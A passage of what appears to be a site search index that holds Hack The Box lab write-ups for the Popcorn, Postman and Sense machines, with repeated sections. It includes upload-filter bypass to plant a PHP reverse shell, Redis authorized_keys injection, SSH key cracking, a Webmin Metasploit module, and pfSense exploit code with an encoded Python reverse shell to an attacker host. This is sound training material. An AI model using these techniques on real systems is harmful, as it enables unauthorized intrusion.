it it\u2019d be on one the online databases. I think that this is a dead end. I tried running the os-pwn SQLmap option as well but could not find any writable directories. Back to square one. Okay let\u2019s create an account using the website, log in and then carry on poking around. Here we can see an upload button. Upload button are ideal candidate to start trying to exploit because they accept user input and allow you to upload things that the developer did not intent for you to upload. When I do anything like, I like to connect Burp Suite to my browser so I can see what is happening behind the scenes. I tried uploading a gif, but the server requires that the you upload a torrent file. So then I tried changing the extension, but still got the same error message. In the end I just uploaded a random torrent file that I got off the internet. Then when I clicked to the browse button. I navigated to the torrent file that I just uploaded. We can see that we now get the option to upload a screenshot for the torrent. Looks like we will try again at uploading a shell but via this up-loader instead. We can see that we have the allowed extensions of jpg, jpeg, gif, png . So let\u2019s just write some test PHP code and try to upload it. Below you can see the dangerous payload. ?php echo ' p Hello World /p '; ? You have to make sure that you change Content-Type to image/png for this to work and that the file extension is a php. Look\u2019s like it worked. Now we have to try and find were the image is stored on the webserver. When we ran Dirbuster there was a folder called uploads. That looks like it should be the right place. The website changed the name of my file, but we can still execute the PHP by clicking it. How exciting. Now let\u2019s try a real payload. I will be using Pentest Monkeys reverse PHP code. You can grab it online or if you\u2019re using kali it can be found at: /usr/share/webshells/php/php-reverse-shell.php Let\u2019s just modify the the hard-coded IP address and port. Then upload this instead of the hello world payload. Start a listener then click on the PHP that we just uploaded. We should get a reverse connection to our netcat listener. nc -vlnp 1234 We now have reverse shell running as the web daemon for the user. By printing the /etc/passwd file we can see that george is the account that we probably want to get into if we cannot jump straight to root. To get the first flag, we just have to go to George's home directory and print out the user.txt file to get the hash 5e36a919398ecc5d5c110f2d865cf136. Get root was quite trivial as we can use a well known exploit call full-nelson. To do this we need to get the c code for the exploit onto the target machine. There are plenty of ways to do this. You could transfer the file over netcat. But I prefer to localy host a webserver on my kali box with the command service apache2 start . Then place the exploit in the web directory /var/www/html/exploit.c . Next just download the file from the target machine with wget http:// ip addr /exploit.c , compile it then run it. Great now we have the final f122331023a9393319a0370129fd9b14","title":"16. Popcorn Writeups.md"},{"location":"Retired/Postman Writeup/","text":"TL;DR Postman from Hack the Box is an easy-rated box which includes exploiting a misconfigured Redis service, allowing you to drop your public key to ssh in the box. It leads to an encrypted SSH private key which is easily crackable through John to get user. For root, I exploit a authenticated vulnerability using Metasploit. Scanning I first run an nmap scan with -sV (determine service/version info) and -sC (run default nmap scripts on ports), saving it to all formats (-oA), calling it initial: nmap -sV -sC -oA nmap/initial 10.10.10.160 The results show that port 22 which is running OpenSSH 7.6p1, port 80 running Apache httpd 2.4.29, and port 10000 running MiniServ 1.910 (Webmin httpd). Note that it mentions that the box is Ubuntu. I won\u2019t bother with SSH as the version is recent and there are no recent exploits for OpenSSH that are useful in this scenario. I also run a scan for all TCP ports with the -p- flag. Note that nmap only scans the top 1000 ports(not in order, but really the top 1000 common ports). nmap -p- --max-retries 1 -oA nmap/allports-tcp 10.10.10.160 It shows that port 6379 is open, which is missed by my initial scan. Port 80 Visiting the page, it mentions that it is under construction. Scrolling down mentions a \u201cpostman@htb\u201d, and a thing about cookies. I then run Gobuster to check for interesting directories: gobuster dir -u [http://10.10.10.160](http://10.10.10.160) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-root The results shows an upload folder: Visiting /upload, I can see images that are used in the website. I found nothing interesting in the other directories. Port 10000 Since nothing is interesting in port 80, I visit port 10000 and it mentions that the web server is running in SSL mode. I also add an entry to my hosts file(/etc/hosts) since I\u2019m using Kali when I solved this box. Visiting the page shows login page to the server postman. Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more. I try to login using basic credentials like admin:admin, but it doesn\u2019t work: Since it is a web-based interface for system administration for Unix, I check searchsploit for any exploits I can use: Since Webmin is running version 1.910, only a few exploits is available. One exploit that is an RCE for version 1.910 requires a valid login when inspecting the exploit. Port 6379 \u2014 Redis I now try to dig in with the Redis service. Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, hyperloglogs, geospatial indexes with radius queries and streams. I first look for ways to interact with the Redis service. Common ways are using telnet, and using the redis-cli. When I initially solved this box, I used telnet but for this writeup I used redis-cli. Using the redis-cli is much easier in this scenario but it is good to know that you can interact with it using telnet. I first check if I connected properly: Then I check the current directory I am in: Finding out that I\u2019m at /var/lib/redis, I try if I can change directories. I did this to find out if I can guess which directories are available/accessible as this Redis user. I then run config get * to list all the supported configuration parameters. One thing that stands out is \u201cauthorized_keys\u201d. I usually come across this in an SSH directory. An authorized_keys file contains the public keys of the users who can login through SSH using key-based. There is also an entry for /var/lib/redis/.ssh: I tried to change my directory to it: Knowing that a /.ssh directory is inside the redis folder, I then looked for write ups on how I can leverage Redis with a /.ssh and came across this page: http://antirez.com/news/96 . I suggest you read it to learn more about Redis security misconfigurations. I then generate a ssh key pair using the ssh-keygen command: I then save the contents of the public key using with new lines to make sure the format is consistent: (echo -e \\n\\n ; cat sifo.pub; echo -e \\n\\n ) foo.txt I then pipe the contents to the redis-cli command and dump it into its memory: cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit I then save what\u2019s in memory to a file called authorized_keys I then try to SSH using the Redis user, and is able to do so. Redis \u2192 Matt Checking the files in the current directory, I tried to read what\u2019s inside its bash_history file. There is an entry of \u201csu Matt\u201d in the bash_history file, a mention of an \u201cid_rsa.bak\u201d and a mention of the sshd_config. I check the passwd file and see that there is a user Matt. I then check for files owned by the Matt: redis@Postman:~$ find / -user Matt 2 /dev/null /opt/id_rsa.bak /home/Matt /home/Matt/.bashrc /home/Matt/.bash_history /home/Matt/.gnupg /home/Matt/.ssh /home/Matt/user.txt /home/Matt/.selected_editor /home/Matt/.local /home/Matt/.local/share /home/Matt/.profile /home/Matt/.cache /home/Matt/.wget-hsts /home/Matt/.bash_logout /var/www/SimpleHTTPPutServer.py It seems that there is backup of an id_rsa file(usually a private key use for SSH) stored in /opt. I move the file to my machine using netcat: Checking its contents, it is encrypted: I then try to crack it using John. I first have to convert the file in a format that John accepts. This can be done using ssh2john.py: ssh2john.py id_rsa.bak id_rsa.enc I then crack it using John: john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.enc The password is computer 2008. I then tried to login using the private key, and when asked for the password, use computer2008: The login is unsuccessful, and prompts me to the root login, asking me for a password. I tried to just switch to the user Matt, using the password computer2008, and it works. I can now read user.txt: Matt@Postman:~$ cat user.txt 517ad0ec24.... Matt \u2192 Root I then check for running processes, and find that Webmin is running as root: I tried to login using the credentials Matt:computer2008, and it works! I then comeback to the exploit mentioned earlier which requires credentials. The vulnerability allows a user authorized to the \u201cPackage Updates\u201d module execute arbitrary commands with root privileges. Details of the vulnerability and exploit can be found here: https://www.cvedetails.com/cve/CVE-2019-12840/ I then run Metasploit and use exploit/linux/http/webmin_packageup_rce. The options that were set can be seen below: Running the exploit leads to a root shell: And now I can now read root.txt.. cat /root/root.txt a257741c5bed8b.... I checked into the /etc/ssh/sshd_config and found out that Matt was denied to login using SSH, hence it not working. I also tried to get a shell, which I am able to by using bash -c: I checked the files under root\u2019s home directory, and found that bash_history is not empty and its size is 14350 characters, which means that maybe I can see how the box creator made the box: Checking the first few commands, it shows how the user installed ssh, installed net-tools, and added the user Matt \ud83d\ude3a And that\u2019s how I solved Postman from HacktheBox! It was a very long journey but definitely worth it! Thanks for reading! \ud83c\udf7a Follow Infosec Write-ups for more such awesome write-ups. InfoSec Write-ups A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. In a nutshell, we are the largest InfoSec publication on Medium. Maintained by Hackrew","title":"9. Postman Writeup.md"},{"location":"Retired/Postman Writeup/#tldr","text":"Postman from Hack the Box is an easy-rated box which includes exploiting a misconfigured Redis service, allowing you to drop your public key to ssh in the box. It leads to an encrypted SSH private key which is easily crackable through John to get user. For root, I exploit a authenticated vulnerability using Metasploit.","title":"TL;DR"},{"location":"Retired/Postman Writeup/#scanning","text":"I first run an nmap scan with -sV (determine service/version info) and -sC (run default nmap scripts on ports), saving it to all formats (-oA), calling it initial: nmap -sV -sC -oA nmap/initial 10.10.10.160 The results show that port 22 which is running OpenSSH 7.6p1, port 80 running Apache httpd 2.4.29, and port 10000 running MiniServ 1.910 (Webmin httpd). Note that it mentions that the box is Ubuntu. I won\u2019t bother with SSH as the version is recent and there are no recent exploits for OpenSSH that are useful in this scenario. I also run a scan for all TCP ports with the -p- flag. Note that nmap only scans the top 1000 ports(not in order, but really the top 1000 common ports). nmap -p- --max-retries 1 -oA nmap/allports-tcp 10.10.10.160 It shows that port 6379 is open, which is missed by my initial scan.","title":"Scanning"},{"location":"Retired/Postman Writeup/#port-80","text":"Visiting the page, it mentions that it is under construction. Scrolling down mentions a \u201cpostman@htb\u201d, and a thing about cookies. I then run Gobuster to check for interesting directories: gobuster dir -u [http://10.10.10.160](http://10.10.10.160) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-root The results shows an upload folder: Visiting /upload, I can see images that are used in the website. I found nothing interesting in the other directories.","title":"Port 80"},{"location":"Retired/Postman Writeup/#port-10000","text":"Since nothing is interesting in port 80, I visit port 10000 and it mentions that the web server is running in SSL mode. I also add an entry to my hosts file(/etc/hosts) since I\u2019m using Kali when I solved this box. Visiting the page shows login page to the server postman. Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more. I try to login using basic credentials like admin:admin, but it doesn\u2019t work: Since it is a web-based interface for system administration for Unix, I check searchsploit for any exploits I can use: Since Webmin is running version 1.910, only a few exploits is available. One exploit that is an RCE for version 1.910 requires a valid login when inspecting the exploit.","title":"Port 10000"},{"location":"Retired/Postman Writeup/#port-6379-redis","text":"I now try to dig in with the Redis service. Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, hyperloglogs, geospatial indexes with radius queries and streams. I first look for ways to interact with the Redis service. Common ways are using telnet, and using the redis-cli. When I initially solved this box, I used telnet but for this writeup I used redis-cli. Using the redis-cli is much easier in this scenario but it is good to know that you can interact with it using telnet. I first check if I connected properly: Then I check the current directory I am in: Finding out that I\u2019m at /var/lib/redis, I try if I can change directories. I did this to find out if I can guess which directories are available/accessible as this Redis user. I then run config get * to list all the supported configuration parameters. One thing that stands out is \u201cauthorized_keys\u201d. I usually come across this in an SSH directory. An authorized_keys file contains the public keys of the users who can login through SSH using key-based. There is also an entry for /var/lib/redis/.ssh: I tried to change my directory to it: Knowing that a /.ssh directory is inside the redis folder, I then looked for write ups on how I can leverage Redis with a /.ssh and came across this page: http://antirez.com/news/96 . I suggest you read it to learn more about Redis security misconfigurations. I then generate a ssh key pair using the ssh-keygen command: I then save the contents of the public key using with new lines to make sure the format is consistent: (echo -e \\n\\n ; cat sifo.pub; echo -e \\n\\n ) foo.txt I then pipe the contents to the redis-cli command and dump it into its memory: cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit I then save what\u2019s in memory to a file called authorized_keys I then try to SSH using the Redis user, and is able to do so.","title":"Port 6379 \u2014 Redis"},{"location":"Retired/Postman Writeup/#redis-matt","text":"Checking the files in the current directory, I tried to read what\u2019s inside its bash_history file. There is an entry of \u201csu Matt\u201d in the bash_history file, a mention of an \u201cid_rsa.bak\u201d and a mention of the sshd_config. I check the passwd file and see that there is a user Matt. I then check for files owned by the Matt: redis@Postman:~$ find / -user Matt 2 /dev/null /opt/id_rsa.bak /home/Matt /home/Matt/.bashrc /home/Matt/.bash_history /home/Matt/.gnupg /home/Matt/.ssh /home/Matt/user.txt /home/Matt/.selected_editor /home/Matt/.local /home/Matt/.local/share /home/Matt/.profile /home/Matt/.cache /home/Matt/.wget-hsts /home/Matt/.bash_logout /var/www/SimpleHTTPPutServer.py It seems that there is backup of an id_rsa file(usually a private key use for SSH) stored in /opt. I move the file to my machine using netcat: Checking its contents, it is encrypted: I then try to crack it using John. I first have to convert the file in a format that John accepts. This can be done using ssh2john.py: ssh2john.py id_rsa.bak id_rsa.enc I then crack it using John: john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.enc The password is computer 2008. I then tried to login using the private key, and when asked for the password, use computer2008: The login is unsuccessful, and prompts me to the root login, asking me for a password. I tried to just switch to the user Matt, using the password computer2008, and it works. I can now read user.txt: Matt@Postman:~$ cat user.txt 517ad0ec24....","title":"Redis \u2192 Matt"},{"location":"Retired/Postman Writeup/#matt-root","text":"I then check for running processes, and find that Webmin is running as root: I tried to login using the credentials Matt:computer2008, and it works! I then comeback to the exploit mentioned earlier which requires credentials. The vulnerability allows a user authorized to the \u201cPackage Updates\u201d module execute arbitrary commands with root privileges. Details of the vulnerability and exploit can be found here: https://www.cvedetails.com/cve/CVE-2019-12840/ I then run Metasploit and use exploit/linux/http/webmin_packageup_rce. The options that were set can be seen below: Running the exploit leads to a root shell: And now I can now read root.txt.. cat /root/root.txt a257741c5bed8b.... I checked into the /etc/ssh/sshd_config and found out that Matt was denied to login using SSH, hence it not working. I also tried to get a shell, which I am able to by using bash -c: I checked the files under root\u2019s home directory, and found that bash_history is not empty and its size is 14350 characters, which means that maybe I can see how the box creator made the box: Checking the first few commands, it shows how the user installed ssh, installed net-tools, and added the user Matt \ud83d\ude3a And that\u2019s how I solved Postman from HacktheBox! It was a very long journey but definitely worth it! Thanks for reading! \ud83c\udf7a Follow Infosec Write-ups for more such awesome write-ups. InfoSec Write-ups A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. In a nutshell, we are the largest InfoSec publication on Medium. Maintained by Hackrew","title":"Matt \u2192 Root"},{"location":"Retired/Sense Writeup wo Metasploit/","text":"This is the 18th blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by TJ_Null can be found here . Let\u2019s get started! Reconnaissance First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA initial 10.10.10.60 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file initial We get back the following result showing that 2 ports are open: Port 80: running lighttpd 1.4.35 over HTTP Port 443: running lighttpd 1.4.35 over HTTPS Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2019-12-28 23:29 EST Nmap scan report for 10.10.10.60 Host is up (0.034s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Did not follow redirect to [https://10.10.10.60/](https://10.10.10.60/) |_https-redirect: ERROR: Script execution failed (use -d to debug) 443/tcp open ssl/https? |_ssl-date: TLS randomness does not represent time Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): OpenBSD 4.X (94%) OS CPE: cpe:/o:openbsd:openbsd:4.0 Aggressive OS guesses: OpenBSD 4.0 (94%), OpenBSD 4.3 (91%) No exact OS matches for host (test conditions non-ideal). OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 117.20 seconds Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -p- -oA full 10.10.10.60 No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -p- -oA udp 10.10.10.60 We get back the following result showing no ports are open. Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2019-12-28 23:45 EST Nmap scan report for 10.10.10.60 Host is up (0.063s latency). All 65535 scanned ports on 10.10.10.60 are open|filtered Nmap done: 1 IP address (1 host up) scanned in 4151.01 seconds Before we move on to enumeration, let\u2019s make a mental note about the nmap scan results. Port 80 redirects to port 443 so we really only have one port to enumerate. Enumeration Let\u2019s start enumerating port 443. Visit the application using the browser. We get a pfSense login page. pfSense is a free and open-source firewall and router. Since it is an off the shelf software, the first thing I did is google \u201cpfsense default credentials\u201d and found the following page. I tried admin/pfsense but that did not work. I also tried common credentials such as admin/admin, pfsense/pfsense, admin/password, etc. When that didn\u2019t work I had a not-so-bright-idea of brute forcing the credentials using Hydra. hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.60 https-post-form /index.php:__csrf_magic=sid%3A44c8728e26d47be027a7a01c98089e974f010329%2C1577594299 usernamefld=^USER^ passwordfld=^PASS^ login=Login:Username or Password incorrect That ended up getting me blocked. In hindsight it makes sense. It wasn\u2019t very smart to brute force the credentials of a firewall. Next, I ran gobuster to enumerate directories. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [https://10.10.10.60](https://10.10.10.60) -k dir: uses directory/file brute forcing mode. -w: path to the wordlist. -u: the target URL or Domain. -k: skip SSL certificate verification. I got back the following results. =============================================================== Gobuster v3.0.1 by OJ Reeves ([@TheColonial](http://twitter.com/TheColonial)) Christian Mehlmauer ([@_FireFart_](http://twitter.com/_FireFart_)) =============================================================== [+] Url: [https://10.10.10.60](https://10.10.10.60) [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/12/29 00:03:57 Starting gobuster =============================================================== /themes (Status: 301) /css (Status: 301) /includes (Status: 301) /javascript (Status: 301) /classes (Status: 301) /widgets (Status: 301) /tree (Status: 301) /shortcuts (Status: 301) /installer (Status: 301) /wizards (Status: 301) /csrf (Status: 301) /filebrowser (Status: 301) /%7Echeckout%7E (Status: 403) =============================================================== 2019/12/29 00:30:17 Finished =============================================================== I didn\u2019t get anything useful. Next, run searchsploit to view if the software is associated with any vulnerabilities. searchsploit pfsense We get back the following result. Nothing really pops out. Most of the exploits require authentication. At this point, I would have given up on this port and started enumerating another port. However, this is the only port we can enumerate for this machine. So we have to find something with gobuster. Let\u2019s change our gobuster command to include extensions. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [https://10.10.10.60](https://10.10.10.60) -k -x php,txt,conf -x: file extension(s) to search for I added the extensions txt conf to look for any configuration files or text files left by system administrators. We get back the following result. =============================================================== Gobuster v3.0.1 by OJ Reeves ([@TheColonial](http://twitter.com/TheColonial)) Christian Mehlmauer ([@_FireFart_](http://twitter.com/_FireFart_)) =============================================================== [+] Url: [https://10.10.10.60](https://10.10.10.60) [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,conf [+] Timeout: 10s =============================================================== 2019/12/29 09:28:51 Starting gobuster =============================================================== /index.php (Status: 200) /help.php (Status: 200) /themes (Status: 301) /stats.php (Status: 200) /css (Status: 301) /edit.php (Status: 200) /includes (Status: 301) /license.php (Status: 200) /system.php (Status: 200) /status.php (Status: 200) /javascript (Status: 301) /changelog.txt (Status: 200) /classes (Status: 301) /exec.php (Status: 200) /widgets (Status: 301) /graph.php (Status: 200) /tree (Status: 301) /wizard.php (Status: 200) /shortcuts (Status: 301) /pkg.php (Status: 200) /installer (Status: 301) /wizards (Status: 301) /xmlrpc.php (Status: 200) /reboot.php (Status: 200) /interfaces.php (Status: 200) /csrf (Status: 301) /system-users.txt (Status: 200) /filebrowser (Status: 301) /%7Echeckout%7E (Status: 403) Two files that immediately catch my eye are changelog.txt system-users.txt. The change-log.txt file tells us that they\u2019re definitely using a vulnerable version of pfSense. However, they did patch two of the three vulnerabilities that are associated with this software. We have to keep that in mind when exploiting the application. The system-users.txt file gives us credentials! The username is rohit and the password is the default password pfsense . Let\u2019s log into the application. The version number is 2.1.3. If we go back to our searchsploit results, one exploit does stand out. Exploitation Transfer the exploit to our directory. searchsploit -m 43560.py Let\u2019s look at the exploit to see what it\u2019s doing. ..... `# command to be converted into octal command = python -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(( %s ,%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([ /bin/sh , -i ]); % (lhost, lport)` `payload = # encode payload in octal for char in command: payload += ( \\\\ + oct(ord(char)).lstrip( 0o )) login_url = https:// + rhost + /index.php exploit_url = https:// + rhost + /status_rrd_graph_img.php?database=queues; + printf+ + + payload + |sh ......` It seems that the status_rrd_graph_img.php script is vulnerable to a command injection. To exploit that, the script is passing a simple python reverse shell (with the configuration parameters we pass as arguments) as a command. It does octal encode the reverse shell command which leads me to believe that there is either some form of filtering being done at the backend or the application crashes on certain characters. To sum up, it\u2019s a very simple script that sends a reverse shell back to our attack machine. Therefore, let\u2019s up a listener to receive the shell. nc -nlvp 1234 Then run the exploit. python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.12 --lport 1234 --username rohit --password pfsense We have a shell! For this machine, we don\u2019t have to escalate privileges since pfSense is running as root and therefore when we exploited the command injection vulnerability we got a shell with root privileges. View the user.txt and root.txt flags. It\u2019s worth noting that this can be easily done manually and is a good exercise for machines that don\u2019t have scripts to automate the exploit. Lessons Learned To gain an initial foothold on the box we exploited three vulnerabilities. Information disclosure. The changelog.txt system-users.txt files were publicly available to anyone that enumerates the directories on the webserver. Those files gave us information about the vulnerabilities in the web server and credential information for one of the accounts. Administrators should never publicly store sensitive information. Use of default credentials. The user used the default password that is shipped with the application. Since default credentials are publicly available and can be easily obtained, the user should have instead used a sufficiently long password that is difficult to crack. Command injection in the pfSense software that allowed us to send a shell back to our attack server. This could have been avoided if the user had patched the system and installed the most recent version of pfSense. As mentioned earlier, we didn\u2019t have to escalate privileges for this box since pfSense runs with root privileges and therefore we got a shell with root privileges. Conclusion 18 machines down, 29 more to go!","title":"26. Sense Writeup w/o Metasploit.md"},{"location":"Retired/Sense Writeup wo Metasploit/#reconnaissance","text":"First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA initial 10.10.10.60 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file initial We get back the following result showing that 2 ports are open: Port 80: running lighttpd 1.4.35 over HTTP Port 443: running lighttpd 1.4.35 over HTTPS Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2019-12-28 23:29 EST Nmap scan report for 10.10.10.60 Host is up (0.034s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Did not follow redirect to [https://10.10.10.60/](https://10.10.10.60/) |_https-redirect: ERROR: Script execution failed (use -d to debug) 443/tcp open ssl/https? |_ssl-date: TLS randomness does not represent time Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): OpenBSD 4.X (94%) OS CPE: cpe:/o:openbsd:openbsd:4.0 Aggressive OS guesses: OpenBSD 4.0 (94%), OpenBSD 4.3 (91%) No exact OS matches for host (test conditions non-ideal). OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 117.20 seconds Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -p- -oA full 10.10.10.60 No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -p- -oA udp 10.10.10.60 We get back the following result showing no ports are open. Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2019-12-28 23:45 EST Nmap scan report for 10.10.10.60 Host is up (0.063s latency). All 65535 scanned ports on 10.10.10.60 are open|filtered Nmap done: 1 IP address (1 host up) scanned in 4151.01 seconds Before we move on to enumeration, let\u2019s make a mental note about the nmap scan results. Port 80 redirects to port 443 so we really only have one port to enumerate.","title":"Reconnaissance"},{"location":"Retired/Sense Writeup wo Metasploit/#enumeration","text":"Let\u2019s start enumerating port 443. Visit the application using the browser. We get a pfSense login page. pfSense is a free and open-source firewall and router. Since it is an off the shelf software, the first thing I did is google \u201cpfsense default credentials\u201d and found the following page. I tried admin/pfsense but that did not work. I also tried common credentials such as admin/admin, pfsense/pfsense, admin/password, etc. When that didn\u2019t work I had a not-so-bright-idea of brute forcing the credentials using Hydra. hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.60 https-post-form /index.php:__csrf_magic=sid%3A44c8728e26d47be027a7a01c98089e974f010329%2C1577594299 usernamefld=^USER^ passwordfld=^PASS^ login=Login:Username or Password incorrect That ended up getting me blocked. In hindsight it makes sense. It wasn\u2019t very smart to brute force the credentials of a firewall. Next, I ran gobuster to enumerate directories. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [https://10.10.10.60](https://10.10.10.60) -k dir: uses directory/file brute forcing mode. -w: path to the wordlist. -u: the target URL or Domain. -k: skip SSL certificate verification. I got back the following results. =============================================================== Gobuster v3.0.1 by OJ Reeves ([@TheColonial](http://twitter.com/TheColonial)) Christian Mehlmauer ([@_FireFart_](http://twitter.com/_FireFart_)) =============================================================== [+] Url: [https://10.10.10.60](https://10.10.10.60) [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/12/29 00:03:57 Starting gobuster =============================================================== /themes (Status: 301) /css (Status: 301) /includes (Status: 301) /javascript (Status: 301) /classes (Status: 301) /widgets (Status: 301) /tree (Status: 301) /shortcuts (Status: 301) /installer (Status: 301) /wizards (Status: 301) /csrf (Status: 301) /filebrowser (Status: 301) /%7Echeckout%7E (Status: 403) =============================================================== 2019/12/29 00:30:17 Finished =============================================================== I didn\u2019t get anything useful. Next, run searchsploit to view if the software is associated with any vulnerabilities. searchsploit pfsense We get back the following result. Nothing really pops out. Most of the exploits require authentication. At this point, I would have given up on this port and started enumerating another port. However, this is the only port we can enumerate for this machine. So we have to find something with gobuster. Let\u2019s change our gobuster command to include extensions. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [https://10.10.10.60](https://10.10.10.60) -k -x php,txt,conf -x: file extension(s) to search for I added the extensions txt conf to look for any configuration files or text files left by system administrators. We get back the following result. =============================================================== Gobuster v3.0.1 by OJ Reeves ([@TheColonial](http://twitter.com/TheColonial)) Christian Mehlmauer ([@_FireFart_](http://twitter.com/_FireFart_)) =============================================================== [+] Url: [https://10.10.10.60](https://10.10.10.60) [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,conf [+] Timeout: 10s =============================================================== 2019/12/29 09:28:51 Starting gobuster =============================================================== /index.php (Status: 200) /help.php (Status: 200) /themes (Status: 301) /stats.php (Status: 200) /css (Status: 301) /edit.php (Status: 200) /includes (Status: 301) /license.php (Status: 200) /system.php (Status: 200) /status.php (Status: 200) /javascript (Status: 301) /changelog.txt (Status: 200) /classes (Status: 301) /exec.php (Status: 200) /widgets (Status: 301) /graph.php (Status: 200) /tree (Status: 301) /wizard.php (Status: 200) /shortcuts (Status: 301) /pkg.php (Status: 200) /installer (Status: 301) /wizards (Status: 301) /xmlrpc.php (Status: 200) /reboot.php (Status: 200) /interfaces.php (Status: 200) /csrf (Status: 301) /system-users.txt (Status: 200) /filebrowser (Status: 301) /%7Echeckout%7E (Status: 403) Two files that immediately catch my eye are changelog.txt system-users.txt. The change-log.txt file tells us that they\u2019re definitely using a vulnerable version of pfSense. However, they did patch two of the three vulnerabilities that are associated with this software. We have to keep that in mind when exploiting the application. The system-users.txt file gives us credentials! The username is rohit and the password is the default password pfsense . Let\u2019s log into the application. The version number is 2.1.3. If we go back to our searchsploit results, one exploit does stand out.","title":"Enumeration"},{"location":"Retired/Sense Writeup wo Metasploit/#exploitation","text":"Transfer the exploit to our directory. searchsploit -m 43560.py Let\u2019s look at the exploit to see what it\u2019s doing. ..... `# command to be converted into octal command = python -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(( %s ,%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([ /bin/sh , -i ]); % (lhost, lport)` `payload = # encode payload in octal for char in command: payload += ( \\\\ + oct(ord(char)).lstrip( 0o )) login_url = https:// + rhost + /index.php exploit_url = https:// + rhost + /status_rrd_graph_img.php?database=queues; + printf+ + + payload + |sh ......` It seems that the status_rrd_graph_img.php script is vulnerable to a command injection. To exploit that, the script is passing a simple python reverse shell (with the configuration parameters we pass as arguments) as a command. It does octal encode the reverse shell command which leads me to believe that there is either some form of filtering being done at the backend or the application crashes on certain characters. To sum up, it\u2019s a very simple script that sends a reverse shell back to our attack machine. Therefore, let\u2019s up a listener to receive the shell. nc -nlvp 1234 Then run the exploit. python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.12 --lport 1234 --username rohit --password pfsense We have a shell! For this machine, we don\u2019t have to escalate privileges since pfSense is running as root and therefore when we exploited the command injection vulnerability we got a shell with root privileges. View the user.txt and root.txt flags. It\u2019s worth noting that this can be easily done manually and is a good exercise for machines that don\u2019t have scripts to automate the exploit.","title":"Exploitation"},{"location":"Retired/Sense Writeup wo Metasploit/#lessons-learned","text":"To gain an initial foothold on the box we exploited three vulnerabilities. Information disclosure. The changelog.txt system-users.txt files were publicly available to anyone that enumerates the directories on the webserver. Those files gave us information about the vulnerabilities in the web server and credential information for one of the accounts. Administrators should never 